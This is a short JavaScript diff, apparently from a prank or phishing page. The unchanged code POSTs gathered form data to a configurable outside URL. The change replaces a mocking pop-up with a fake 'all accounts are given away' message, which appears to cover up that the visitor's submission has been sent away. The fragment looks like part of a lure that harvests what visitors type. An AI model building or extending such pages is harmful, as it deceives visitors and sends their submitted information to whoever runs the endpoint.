@@ -27,7 +27,7 @@ if (isMobile) {
 		xhr.open("POST", yourUrl, true);
 		xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
 		xhr.send(data);
-		alert("You've got no Crush you lonely dumbass"); 
+		alert("Oops! You're late. All accounts are given away"); 
 	}
 	else{
 		var xhr = new XMLHttpRequest();
@@ -36,7 +36,7 @@ if (isMobile) {
 		xhr.open("POST", yourUrl, true);
 		xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
 		xhr.send(data);
-		alert("You've got no Crush you lonely dumbass"); 
+		alert("Oops! You're late. All accounts are given away"); 
 	}
 }
 };
